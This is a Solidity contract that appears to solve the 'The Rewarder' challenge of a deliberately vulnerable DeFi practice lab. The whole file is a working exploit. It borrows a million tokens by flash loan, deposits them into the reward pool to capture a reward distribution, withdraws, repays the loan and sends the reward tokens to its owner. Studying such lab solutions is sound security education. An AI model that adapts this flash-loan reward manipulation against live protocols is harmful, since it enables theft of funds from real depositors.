// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract AttackRewarder {


    address private immutable owner;
    IERC20 public immutable damnValuableToken;
    FlashLoanerPool public immutable flashLoanContract;
    TheRewarderPool public immutable rewarderPoolContract;
    IERC20 public immutable rwdToken;


    uint256 private drainerNumber = 1_000_000 * 10 ** 18;

    constructor (address tokenAddress, address flashLoanAddress, address rewardPoolAddress, address rwdAddress) {
        owner = msg.sender;
        damnValuableToken = IERC20(tokenAddress);
        flashLoanContract = FlashLoanerPool(flashLoanAddress);
        rewarderPoolContract = TheRewarderPool(rewardPoolAddress);
        rwdToken = IERC20(rwdAddress);
    }


    function LoanTrigger() public {
        require(damnValuableToken.balanceOf(address(flashLoanContract)) > 0, "contract is empty");
        flashLoanContract.flashLoan(drainerNumber);
    }

    // Do the magic here
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanContract), "Sender must be pool");

        require(damnValuableToken.balanceOf(address(this)) == amount, "balance error!");

        damnValuableToken.approve(address(rewarderPoolContract), amount);
        rewarderPoolContract.deposit(amount);   // distributeRewards is called inside
        rewarderPoolContract.withdraw(amount);


        bool success = damnValuableToken.transfer(address(flashLoanContract), amount);
        require(success == true, "couldn't be sent");
    }


    function withdrawRWT() public {
        require (msg.sender == owner, 'owner issue');
        rwdToken.transfer(msg.sender, rwdToken.balanceOf(address(this)));
    }

}